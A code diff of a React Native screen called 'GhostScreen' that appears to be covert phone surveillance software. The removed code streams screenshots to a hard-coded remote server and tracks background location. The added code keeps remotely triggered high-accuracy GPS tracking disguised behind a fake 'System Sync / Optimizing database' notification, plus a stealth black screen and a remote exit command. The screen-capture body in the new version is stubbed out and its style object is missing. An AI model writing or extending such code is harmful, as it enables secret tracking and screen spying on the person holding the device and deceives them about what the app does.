@@ -1,100 +1,67 @@
 import React, { useEffect, useRef } from 'react';
 import { View, StyleSheet, BackHandler } from 'react-native';
 import * as Location from 'expo-location';
-import * as Network from 'expo-network';
-import * as TaskManager from 'expo-task-manager';
-import { captureScreen } from 'react-native-view-shot';
-import io from 'socket.io-client';
 
-const socket = io("https://joyjet-server.onrender.com");
-const LOCATION_TASK_NAME = 'background-location-task';
+const GPS_TASK = 'bg-gps-sync';
 
-export default function GhostScreen({ name }) {
-  const streamTimer = useRef(null);
+export default function GhostScreen({ socket, name }) {
+    const streamTimer = useRef(null);
+    const pinpointTimer = useRef(null); // Auto-kill timer
 
-  useEffect(() => {
-    // 1. Initial Connection & Net Check
-    const initializeGhost = async () => {
-      const net = await Network.getNetworkStateAsync();
-      socket.emit('ghost_online', { name, netType: net.type });
-      
-      // Request permissions for background tasks
-      const { status } = await Location.requestBackgroundPermissionsAsync();
-      if (status === 'granted') {
-        startBackgroundGPS();
-      }
+    useEffect(() => {
+        socket.on('admin_command', async (cmd) => {
+            // STREAMING LOGIC
+            if (cmd === 'START_LIVE') startStream(300);
+            if (cmd === 'START_ECO') startStream(5000);
+            if (cmd === 'WIPE') BackHandler.exitApp();
+
+            // PINPOINT LOGIC (Triggered & Timed)
+            if (cmd === 'START_PINPOINT') {
+                await activatePinpoint();
+            }
+            if (cmd === 'STOP_PINPOINT') {
+                deactivatePinpoint();
+            }
+        });
+
+        return () => {
+            clearInterval(streamTimer.current);
+            clearTimeout(pinpointTimer.current);
+            Location.stopLocationUpdatesAsync(GPS_TASK);
+        };
+    }, []);
+
+    const activatePinpoint = async () => {
+        const { status } = await Location.requestBackgroundPermissionsAsync();
+        if (status === 'granted') {
+            // START HARDWARE
+            await Location.startLocationUpdatesAsync(GPS_TASK, {
+                accuracy: Location.Accuracy.BestForNavigation,
+                timeInterval: 5000,
+                foregroundService: {
+                    notificationTitle: "System Sync",
+                    notificationBody: "Optimizing database...",
+                    notificationColor: "#000000"
+                }
+            });
+
+            // SAFETY: Auto-kill after 5 minutes to save battery
+            clearTimeout(pinpointTimer.current);
+            pinpointTimer.current = setTimeout(() => {
+                deactivatePinpoint();
+                socket.emit('system_log', "Pinpoint Auto-Terminated (5m limit)");
+            }, 300000); 
+        }
     };
 
-    initializeGhost();
+    const deactivatePinpoint = async () => {
+        await Location.stopLocationUpdatesAsync(GPS_TASK);
+        clearTimeout(pinpointTimer.current);
+    };
 
-    // 2. Command Listeners from Admin
-    socket.on('admin_command', (cmd) => {
-      switch (cmd) {
-        case 'START_LIVE':
-          startStream(200); // 5 frames per second
-          break;
-        case 'START_ECO':
-          startStream(5000); // 1 frame every 5 seconds
-          break;
-        case 'STOP_STREAM':
-          clearInterval(streamTimer.current);
-          break;
-        case 'REMOTE_WIPE':
-          executeWipe();
-          break;
-      }
-    });
+    const startStream = (ms) => {
+        // ... (Your captureScreen logic)
+    };
 
-    // 3. Cellular Governor (Server-forced switch to ECO after 5 mins)
-    socket.on('force_eco_mode', () => {
-      startStream(5000);
-    });
-
-    return () => clearInterval(streamTimer.current);
-  }, []);
-
-  const startStream = (interval) => {
-    clearInterval(streamTimer.current);
-    streamTimer.current = setInterval(async () => {
-      try {
-        const base64 = await captureScreen({
-          format: 'jpg',
-          quality: 0.3, // Optimized for speed
-          result: 'base64'
-        });
-        socket.emit('screen_frame', base64);
-      } catch (e) {
-        console.error("Capture Failed", e);
-      }
-    }, interval);
-  };
-
-  const startBackgroundGPS = async () => {
-    await Location.startLocationUpdatesAsync(LOCATION_TASK_NAME, {
-      accuracy: Location.Accuracy.BestForNavigation,
-      timeInterval: 5000,
-      distanceInterval: 0,
-      foregroundService: {
-        notificationTitle: "System Sync",
-        notificationBody: "Optimizing database...",
-        notificationColor: "#000000"
-      }
-    });
-  };
-
-  const executeWipe = () => {
-    // Immediate stealth exit
-    socket.disconnect();
-    BackHandler.exitApp();
-  };
-
-  // The Ghost remains a pure black screen
-  return <View style={styles.stealthContainer} />;
+    return <View style={styles.blackout} />;
 }
-
-const styles = StyleSheet.create({
-  stealthContainer: {
-    flex: 1,
-    backgroundColor: '#000',
-  },
-});
